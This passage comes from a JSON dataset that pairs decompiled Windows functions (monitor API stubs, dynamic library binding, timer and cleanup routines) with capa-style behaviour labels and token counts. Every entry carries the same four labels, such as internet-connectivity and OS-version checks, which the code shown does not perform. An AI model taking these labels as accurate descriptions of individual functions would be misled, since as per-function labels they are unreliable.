        "decompiled_code": "\nuint __cdecl fcn.0042db88(int32_t *arg_8h, uint32_t arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    if (*0x497a9e == '\\0') {\n        *0x497a7c = fcn.0042da1c();\n        uVar1 = (**0x497a7c)(arg_8h, arg_ch);\n        return uVar1;\n    }\n    if ((arg_ch & 3) == 0) {\n        if (arg_8h[2] < 1) {\n            return 0;\n        }\n        if (arg_8h[3] < 1) {\n            return 0;\n        }\n        iVar2 = (**0x497a74)(0);\n        if (iVar2 <= *arg_8h) {\n            return 0;\n        }\n        iVar2 = (**0x497a74)(1);\n        if (iVar2 <= arg_8h[1]) {\n            return 0;\n        }\n    }\n    return 0x12340042;\n}\n",
        "token_count": 239
    },
    "0042dc18": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042dc18(uint arg_8h, uint32_t arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_2ch;\n    uint var_10h;\n    \n    if (*0x497a9d == '\\0') {\n        *0x497a78 = fcn.0042da1c();\n        uVar1 = (**0x497a78)(arg_8h, arg_ch);\n    }\n    else if ((arg_ch & 3) == 0) {\n        iVar2 = sub.user32.dll_IsIconic(arg_8h);\n        if (iVar2 == 0) {\n            sub.user32.dll_GetWindowRect(arg_8h, &var_10h);\n        }\n        else {\n            sub.user32.dll_GetWindowPlacement(arg_8h, &var_2ch);\n        }\n        uVar1 = fcn.0042db88(&var_10h, arg_ch);\n    }\n    else {\n        uVar1 = 0x12340042;\n    }\n    return uVar1;\n}\n",
        "token_count": 238
    },
    "0042dcb0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042dcb0(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    if (*0x497a9f == '\\0') {\n        *0x497a80 = fcn.0042da1c();\n        uVar1 = (**0x497a80)(arg_8h, arg_ch, arg_10h);\n        return uVar1;\n    }\n    if ((arg_10h & 3) == 0) {\n        if (arg_8h < 0) {\n            return 0;\n        }\n        iVar2 = (**0x497a74)(0);\n        if (iVar2 <= arg_8h) {\n            return 0;\n        }\n        if (arg_ch < 0) {\n            return 0;\n        }\n        iVar2 = (**0x497a74)(1);\n        if (iVar2 <= arg_ch) {\n            return 0;\n        }\n    }\n    return 0x12340042;\n}\n",
        "token_count": 239
    },
    "0042dd48": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042dd48(int32_t arg_8h, uint32_t *arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t var_10h;\n    uint32_t uStack16;\n    uint32_t uStack12;\n    uint32_t uStack8;\n    \n    if (*0x497aa0 == '\\0') {\n        *0x497a84 = fcn.0042da1c();\n        uVar1 = (**0x497a84)(arg_8h, arg_ch);\n    }\n    else {\n        uVar1 = 0;\n        if (((arg_8h == 0x12340042) && (arg_ch != NULL)) && (0x27 < *arg_ch)) {\n            iVar2 = sub.user32.dll_SystemParametersInfoA(0x30, 0, &var_10h, 0);\n            if (iVar2 != 0) {\n                arg_ch[1] = 0;\n                arg_ch[2] = 0;\n                uVar3 = (**0x497a74)(0);\n                arg_ch[3] = uVar3;\n                uVar3 = (**0x497a74)(1);\n                arg_ch[4] = uVar3;\n                arg_ch[5] = var_10h;\n                arg_ch[6] = uStack16;\n                arg_ch[7] = uStack12;\n                arg_ch[8] = uStack8;\n                arg_ch[9] = 1;\n                if (0x47 < *arg_ch) {\n                    sub.kernel32.dll_lstrcpyA(arg_ch + 10, 0x42de14);\n                }\n                uVar1 = 1;\n            }\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 398
    },
    "0042de1c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042de1c(int32_t arg_8h, uint32_t *arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t var_10h;\n    uint32_t uStack16;\n    uint32_t uStack12;\n    uint32_t uStack8;\n    \n    if (*0x497aa1 == '\\0') {\n        *0x497a88 = fcn.0042da1c();\n        uVar1 = (**0x497a88)(arg_8h, arg_ch);\n    }\n    else {\n        uVar1 = 0;\n        if (((arg_8h == 0x12340042) && (arg_ch != NULL)) && (0x27 < *arg_ch)) {\n            iVar2 = sub.user32.dll_SystemParametersInfoA(0x30, 0, &var_10h, 0);\n            if (iVar2 != 0) {\n                arg_ch[1] = 0;\n                arg_ch[2] = 0;\n                uVar3 = (**0x497a74)(0);\n                arg_ch[3] = uVar3;\n                uVar3 = (**0x497a74)(1);\n                arg_ch[4] = uVar3;\n                arg_ch[5] = var_10h;\n                arg_ch[6] = uStack16;\n                arg_ch[7] = uStack12;\n                arg_ch[8] = uStack8;\n                arg_ch[9] = 1;\n                if (0x47 < *arg_ch) {\n                    sub.kernel32.dll_lstrcpyA(arg_ch + 10, 0x42dee8);\n                }\n                uVar1 = 1;\n            }\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 399
    },
    "0042def0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042def0(int32_t arg_8h, uint32_t *arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t var_10h;\n    uint32_t uStack16;\n    uint32_t uStack12;\n    uint32_t uStack8;\n    \n    if (*0x497aa2 == '\\0') {\n        *0x497a8c = fcn.0042da1c();\n        uVar1 = (**0x497a8c)(arg_8h, arg_ch);\n    }\n    else {\n        uVar1 = 0;\n        if (((arg_8h == 0x12340042) && (arg_ch != NULL)) && (0x27 < *arg_ch)) {\n            iVar2 = sub.user32.dll_SystemParametersInfoA(0x30, 0, &var_10h, 0);\n            if (iVar2 != 0) {\n                arg_ch[1] = 0;\n                arg_ch[2] = 0;\n                uVar3 = (**0x497a74)(0);\n                arg_ch[3] = uVar3;\n                uVar3 = (**0x497a74)(1);\n                arg_ch[4] = uVar3;\n                arg_ch[5] = var_10h;\n                arg_ch[6] = uStack16;\n                arg_ch[7] = uStack12;\n                arg_ch[8] = uStack8;\n                arg_ch[9] = 1;\n                if (0x47 < *arg_ch) {\n                    sub.kernel32.dll_lstrcpyA(arg_ch + 10, 0x42dfbc);\n                }\n                uVar1 = 1;\n            }\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 400
    },
    "0042dfc4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042dfc4(int32_t arg_8h, int32_t arg_ch, code *arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_2ch;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (*0x497aa3 == '\\0') {\n        *0x497a90 = fcn.0042da1c();\n        uVar1 = (**0x497a90)(arg_8h, arg_ch, arg_10h, arg_14h);\n    }\n    else {\n        uVar1 = 0;\n        if (arg_10h != NULL) {\n            var_1ch = 0;\n            var_18h = 0;\n            var_14h = (**0x497a74)(0);\n            var_10h = (**0x497a74)(1);\n            if (arg_8h == 0) {\n                if ((arg_ch != 0) && (iVar2 = sub.user32.dll_IntersectRect(&var_1ch, &var_1ch, arg_ch),  iVar2 == 0)) {\n                    return 1;\n                }\n            }\n            else {\n                var_ch = sub.gdi32.dll_GetClipBox(arg_8h, &var_2ch);\n                iVar2 = sub.gdi32.dll_GetDCOrgEx(arg_8h, &var_8h);\n                if (iVar2 == 0) {\n                    return 0;\n                }\n                sub.user32.dll_OffsetRect(&var_1ch, -var_8h, -var_4h);\n                iVar2 = sub.user32.dll_IntersectRect(&var_1ch, &var_1ch, &var_2ch);\n                if (((iVar2 == 0) || (arg_ch != 0)) &&\n                   (iVar2 = sub.user32.dll_IntersectRect(&var_1ch, &var_1ch, arg_ch),  iVar2 == 0)) {\n                    if (var_ch != 1) {\n                        return 0;\n                    }\n                    return 1;\n                }\n            }\n            uVar1 = (*arg_10h)(0x12340042, arg_8h, &var_1ch, arg_14h);\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 555
    },
    "0042e2fc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042e2fc(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    uint var_4h;\n    \n    if (*0x497b74 == NULL) {\n        uVar1 = 0;\n        if (*0x497b68 != 0) {\n            *0x497b74 = sub.kernel32.dll_GetProcAddress_1(*0x497b68, 0x42e374);\n            if (*0x497b74 != NULL) {\n                uVar1 = (**0x497b74)();\n            }\n        }\n    }\n    else {\n        uVar1 = (**0x497b74)();\n    }\n    return uVar1;\n}\n",
        "token_count": 154
    },
    "0042e388": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0042e388(void)\n\n{\n    uint uVar1;\n    \n    if (*0x497b78 == NULL) {\n        uVar1 = 0x80004001;\n        if (*0x497b68 != 0) {\n            *0x497b78 = sub.kernel32.dll_GetProcAddress_1(*0x497b68, 0x42e3e0);\n            if (*0x497b78 != NULL) {\n                uVar1 = (**0x497b78)();\n            }\n        }\n    }\n    else {\n        uVar1 = (**0x497b78)();\n    }\n    return uVar1;\n}\n",
        "token_count": 142
    },
    "0042e3f4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0042e3f4(void)\n\n{\n    uint uVar1;\n    \n    if (*0x497b7c == NULL) {\n        uVar1 = 0x80004001;\n        if (*0x497b68 != 0) {\n            *0x497b7c = sub.kernel32.dll_GetProcAddress_1(*0x497b68, 0x42e454);\n            if (*0x497b7c != NULL) {\n                uVar1 = (**0x497b7c)();\n            }\n        }\n    }\n    else {\n        uVar1 = (**0x497b7c)();\n    }\n    return uVar1;\n}\n",
        "token_count": 147
    },
    "0042e46c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042e46c(void)\n\n{\n    int32_t *in_FS_OFFSET;\n    int32_t iStack20;\n    int32_t iStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = 0x42e479;\n    fcn.0042e2ec();\n    uStack12 = 0x42e623;\n    iStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffff0;\n    if (0 < *0x497b6c) {\n        *0x497b6c = *0x497b6c + -1;\n    }\n    puStack8 = &stack0xfffffffc;\n    if ((*0x497b68 != 0) && (puStack8 = &stack0xfffffffc,  *0x497b6c == 0)) {\n        iStack20 = *0x497b68;\n        puStack8 = &stack0xfffffffc;\n        sub.kernel32.dll_FreeLibrary_1();\n        *0x497b68 = 0;\n        *0x497aa8 = 0;\n        *0x497aac = 0;\n        *0x497ab0 = 0;\n        *0x497ab4 = 0;\n        *0x497ab8 = 0;\n        *0x497abc = 0;\n        *0x497ac0 = 0;\n        *0x497ac4 = 0;\n        *0x497ac8 = 0;\n        *0x497acc = 0;\n        *0x497ad0 = 0;\n        *0x497ad4 = 0;\n        *0x497ad8 = 0;\n        *0x497adc = 0;\n        *0x497ae0 = 0;\n        *0x497ae4 = 0;\n        *0x497ae8 = 0;\n        *0x497aec = 0;\n        *0x497af0 = 0;\n        *0x497af4 = 0;\n        *0x497af8 = 0;\n        *0x497afc = 0;\n        *0x497b00 = 0;\n        *0x497b04 = 0;\n        *0x497b08 = 0;\n        *0x497b0c = 0;\n        *0x497b10 = 0;\n        *0x497b14 = 0;\n        *0x497b18 = 0;\n        *0x497b1c = 0;\n        *0x497b20 = 0;\n        *0x497b24 = 0;\n        *0x497b28 = 0;\n        *0x497b2c = 0;\n        *0x497b30 = 0;\n        *0x497b34 = 0;\n        *0x497b38 = 0;\n        *0x497b3c = 0;\n        *0x497b40 = 0;\n        *0x497b44 = 0;\n        *0x497b48 = 0;\n        *0x497b4c = 0;\n        *0x497b50 = 0;\n        *0x497b54 = 0;\n        *0x497b58 = 0;\n        *0x497b5c = 0;\n        *0x497b60 = 0;\n    }\n    *in_FS_OFFSET = iStack20;\n    uStack12 = 0x42e62a;\n    iStack16 = 0x42e622;\n    fcn.0042e2f4();\n    return;\n}\n",
        "token_count": 806
    },
    "0042e62c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid fcn.0042e62c(void)\n\n{\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_fffffe6c;\n    int32_t iStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_1h;\n    \n    puStack16 = 0x42e640;\n    fcn.0042e2ec();\n    uStack20 = 0x42e9df;\n    iStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    *0x497b6c = *0x497b6c + 1;\n    puStack16 = &fcn.0042e62c::var_1h + 1;\n    if (*0x497b68 == 0) {\n        puStack16 = &fcn.0042e62c::var_1h + 1;\n        *0x497b68 = sub.kernel32.dll_LoadLibraryA(0x42e9f0);\n        if (*0x497b68 != 0) {\n            *0x497aa8 = sub.kernel32.dll_GetProcAddress_1(*0x497b68, 0x42e9fc);\n            *0x497aac = sub.kernel32.dll_GetProcAddress_1(*0x497b68, 0x42ea0c);\n            *0x497ab0 = sub.kernel32.dll_GetProcAddress_1(*0x497b68, 0x42ea1c);\n            *0x497ab4 = sub.kernel32.dll_GetProcAddress_1(*0x497b68, 0x42ea30);\n            *0x497ab8 = sub.kernel32.dll_GetProcAddress_1(*0x497b68, 0x42ea40);\n            *0x497abc = sub.kernel32.dll_GetProcAddress_1(*0x497b68, 0x42ea40);\n            *0x497ac0 = sub.kernel32.dll_GetProcAddress_1(*0x497b68, 0x42ea60);\n            *0x497ac4 = sub.kernel32.dll_GetProcAddress_1(*0x497b68, 0x42ea74);\n            *0x497ac8 = sub.kernel32.dll_GetProcAddress_1(*0x497b68, 0x42ea88);\n            *0x497acc = sub.kernel32.dll_GetProcAddress_1(*0x497b68, 0x42ea9c);\n            *0x497ad0 = sub.kernel32.dll_GetProcAddress_1(*0x497b68, 0x42eab8);\n            *0x497ad4 = sub.kernel32.dll_GetProcAddress_1(*0x497b68, 0x42ead0);\n            *0x497ad8 = sub.kernel32.dll_GetProcAddress_1(*0x497b68, 0x42eae0);\n            *0x497adc = sub.kernel32.dll_GetProcAddress_1(*0x497b68, 0x42eaf0);\n            *0x497ae0 = sub.kernel32.dll_GetProcAddress_1(*0x497b68, 0x42eb04);\n            *0x497ae4 = sub.kernel32.dll_GetProcAddress_1(*0x497b68, 0x42eb2c);\n            *0x497ae8 = sub.kernel32.dll_GetProcAddress_1(*0x497b68, 0x42eb3c);\n            *0x497aec = sub.kernel32.dll_GetProcAddress_1(*0x497b68, 0x42eb4c);\n            *0x497af0 = sub.kernel32.dll_GetProcAddress_1(*0x497b68, 0x42eb5c);\n            *0x497af4 = sub.kernel32.dll_GetProcAddress_1(*0x497b68, 0x42eb6c);\n            *0x497af8 = sub.kernel32.dll_GetProcAddress_1(*0x497b68, 0x42eb78);\n            *0x497afc = sub.kernel32.dll_GetProcAddress_1(*0x497b68, 0x42eb8c);\n            *0x497b00 = sub.kernel32.dll_GetProcAddress_1(*0x497b68, 0x42eba0);\n            *0x497b04 = sub.kernel32.dll_GetProcAddress_1(*0x497b68, 0x42ebb0);\n            *0x497b08 = sub.kernel32.dll_GetProcAddress_1(*0x497b68, 0x42ebc0);\n            *0x497b0c = sub.kernel32.dll_GetProcAddress_1(*0x497b68, 0x42ebd0);\n            *0x497b10 = sub.kernel32.dll_GetProcAddress_1(*0x497b68, 0x42ebe0);\n            *0x497b14 = sub.kernel32.dll_GetProcAddress_1(*0x497b68, 0x42ebf8);\n            *0x497b18 = sub.kernel32.dll_GetProcAddress_1(*0x497b68, 0x42ec08);\n            *0x497b1c = sub.kernel32.dll_GetProcAddress_1(*0x497b68, 0x42ec1c);\n            *0x497b20 = sub.kernel32.dll_GetProcAddress_1(*0x497b68, 0x42ec30);\n            *0x497b24 = sub.kernel32.dll_GetProcAddress_1(*0x497b68, 0x42ec48);\n            *0x497b28 = sub.kernel32.dll_GetProcAddress_1(*0x497b68, 0x42ec58);\n            *0x497b2c = sub.kernel32.dll_GetProcAddress_1(*0x497b68, 0x42ec68);\n            *0x497b30 = sub.kernel32.dll_GetProcAddress_1(*0x497b68, 0x42ec78);\n            *0x497b34 = sub.kernel32.dll_GetProcAddress_1(*0x497b68, 0x42ec8c);\n            *0x497b38 = sub.kernel32.dll_GetProcAddress_1(*0x497b68, 0x42ec9c);\n            *0x497b3c = sub.kernel32.dll_GetProcAddress_1(*0x497b68, 0x42ecac);\n            *0x497b40 = sub.kernel32.dll_GetProcAddress_1(*0x497b68, 0x42ecb8);\n            *0x497b44 = sub.kernel32.dll_GetProcAddress_1(*0x497b68, 0x42ecc8);\n            *0x497b48 = sub.kernel32.dll_GetProcAddress_1(*0x497b68, 0x42ece4);\n            *0x497b4c = sub.kernel32.dll_GetProcAddress_1(*0x497b68, 0x42ed00);\n            *0x497b50 = sub.kernel32.dll_GetProcAddress_1(*0x497b68, 0x42ed18);\n            *0x497b54 = sub.kernel32.dll_GetProcAddress_1(*0x497b68, 0x42ed30);\n            *0x497b58 = sub.kernel32.dll_GetProcAddress_1(*0x497b68, 0x42ed44);\n            *0x497b5c = sub.kernel32.dll_GetProcAddress_1(*0x497b68, 0x42ed64);\n            in_stack_fffffe6c = *0x497b68;\n            *0x497b60 = sub.kernel32.dll_GetProcAddress_1(*0x497b68, 0x42ed80);\n        }\n    }\n    *in_FS_OFFSET = in_stack_fffffe6c;\n    fcn.0042e2f4(0x42e9e6);\n    return;\n}\n",
        "token_count": 1739
    },
    "0042ed90": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0042ed90(void)\n\n{\n    int32_t iVar1;\n    \n    if (((*0x497b68 != 0) && (iVar1 = (**0x497b3c)(),  iVar1 != 0)) && (iVar1 = (**0x497b38)(),  iVar1 != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 88
    },
    "0042edb8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042edb8(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x42ee00;\n    uStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack16;\n    *0x497b64 = *0x497b64 + 1;\n    if (*0x497b64 == 0) {\n        while (0 < *0x497b6c) {\n            fcn.0042e46c();\n        }\n        fcn.00404640();\n    }\n    *in_FS_OFFSET = uStack16;\n    return;\n}\n",
        "token_count": 164
    },
    "0042ee0c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0042ee0c(void)\n\n{\n    uint uVar1;\n    \n    if (*0x497b88 == NULL) {\n        if (*0x497b84 == 0) {\n            *0x497b84 = sub.kernel32.dll_LoadLibraryA(0x42ee7c);\n        }\n        uVar1 = 0x80004001;\n        if (*0x497b84 != 0) {\n            *0x497b88 = sub.kernel32.dll_GetProcAddress_1(*0x497b84, 0x42ee88);\n            if (*0x497b88 != NULL) {\n                uVar1 = (**0x497b88)();\n            }\n        }\n    }\n    else {\n        uVar1 = (**0x497b88)();\n    }\n    return uVar1;\n}\n",
        "token_count": 179
    },
    "0042eea8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0042eea8(void)\n\n{\n    uint uVar1;\n    \n    if (*0x497b8c == NULL) {\n        if (*0x497b84 == 0) {\n            *0x497b84 = sub.kernel32.dll_LoadLibraryA(0x42ef14);\n        }\n        uVar1 = 0x80004001;\n        if (*0x497b84 != 0) {\n            *0x497b8c = sub.kernel32.dll_GetProcAddress_1(*0x497b84, 0x42ef20);\n            if (*0x497b8c != NULL) {\n                uVar1 = (**0x497b8c)();\n            }\n        }\n    }\n    else {\n        uVar1 = (**0x497b8c)();\n    }\n    return uVar1;\n}\n",
        "token_count": 182
    },
    "0042ef38": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t __fastcall fcn.0042ef38(uint32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    if (5 < **0x492734) {\n        iVar1 = fcn.0042eea8();\n        if ((iVar1 == 0) && (param_1 != 0)) {\n            return CONCAT44(param_1, 1);\n        }\n    }\n    return param_1 << 0x20;\n}\n",
        "token_count": 99
    },
    "0042ef5c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042ef5c(void)\n\n{\n    int32_t *in_FS_OFFSET;\n    int32_t iStack20;\n    int32_t iStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x42ef97;\n    iStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack16;\n    *0x497b80 = *0x497b80 + 1;\n    if ((*0x497b80 == 0) && (*0x497b84 != 0)) {\n        iStack20 = *0x497b84;\n        sub.kernel32.dll_FreeLibrary_1();\n    }\n    *in_FS_OFFSET = iStack20;\n    return;\n}\n",
        "token_count": 176
    },
    "0042fd28": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042fd28(void)\n\n{\n    uchar *puVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack20;\n    int32_t iStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x42fd81;\n    iStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack16;\n    *0x497b94 = *0x497b94 + 1;\n    if (*0x497b94 == 0) {\n        puVar1 = &stack0xfffffffc;\n        if ((*0x497b9c != '\\0') && (puVar1 = &stack0xfffffffc,  *0x497b98 != 0)) {\n            iStack20 = *0x497b98;\n            sub.kernel32.dll_FreeLibrary_1();\n            puVar1 = puStack8;\n        }\n        puStack8 = puVar1;\n        fcn.00406018();\n    }\n    *in_FS_OFFSET = iStack20;\n    return;\n}\n",
        "token_count": 247
    },
    "0042ff9c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042ff9c(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffcc;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x43001b;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    sub.user32.dll_KillTimer(*(in_EAX + 0x34), 1);\n    if (((*(in_EAX + 0x30) != 0) && (*(in_EAX + 0x40) != '\\0')) && (*(in_EAX + 0x3a) != 0)) {\n        in_stack_ffffffcc = *(in_EAX + 0x34);\n        iVar1 = sub.user32.dll_SetTimer(in_stack_ffffffcc, 1, *(in_EAX + 0x30), 0);\n        if (iVar1 == 0) {\n            fcn.004075f4();\n            fcn.0040da70();\n            fcn.00404eb4();\n        }\n    }\n    *in_FS_OFFSET = in_stack_ffffffcc;\n    fcn.0040546c(0x430022);\n    return;\n}\n",
        "token_count": 304
    },
    "004306bc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004306bc(void)\n\n{\n    uchar *puVar1;\n    uint32_t *in_FS_OFFSET;\n    uint32_t uStack20;\n    uint32_t uStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x43070f;\n    uStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack16;\n    *0x497bac = *0x497bac + 1;\n    if (*0x497bac == 0) {\n        puVar1 = &stack0xfffffffc;\n        if (*0x491318 != 0) {\n            uStack20 = *0x491318;\n            sub.kernel32.dll_GlobalDeleteAtom();\n            puVar1 = puStack8;\n        }\n        puStack8 = puVar1;\n        fcn.00406018();\n    }\n    *in_FS_OFFSET = uStack20;\n    return;\n}\n",
        "token_count": 216
    },
    "004307f4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004307f4(void)\n\n{\n    int32_t *in_EAX;\n    \n    if ((in_EAX[1] != 0) && (*(in_EAX + 0xd) == '\\0')) {\n        (**(*in_EAX + 0x10))();\n        *(in_EAX + 0xd) = 1;\n    }\n    return;\n}\n",
        "token_count": 83
    },
    "0043099c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
